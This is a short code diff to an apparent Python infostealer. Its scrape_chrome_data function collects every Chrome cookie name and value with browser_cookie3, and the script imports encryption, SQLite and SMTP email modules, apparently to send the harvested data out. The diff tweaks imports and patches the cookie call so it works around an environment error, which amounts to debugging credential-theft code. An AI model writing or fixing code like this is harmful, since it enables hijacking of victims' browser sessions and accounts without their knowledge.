@@ -3,14 +3,12 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import os
 import base64
-import json
 import sqlite3
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-import subprocess
-import time
 import browser_cookie3
+import subprocess
 
 # Global encryption key
 key = os.urandom(32)  # Use a securely stored key in production
@@ -33,7 +31,8 @@ def decrypt_data(encrypted_data):
 def scrape_chrome_data():
     cookies = []
     try:
-        cj = browser_cookie3.chrome()  # Get cookies from Chrome
+        # Bypass the environment variable issue for cookies
+        cj = browser_cookie3.chrome(cookie_file=None)  # Use None to bypass the DBUS_SESSION_BUS_ADDRESS issue
         for cookie in cj:
             cookies.append(f"Name: {cookie.name}, Value: {cookie.value}")
         cookies_data = "\n".join(cookies)  # Join cookies into a string
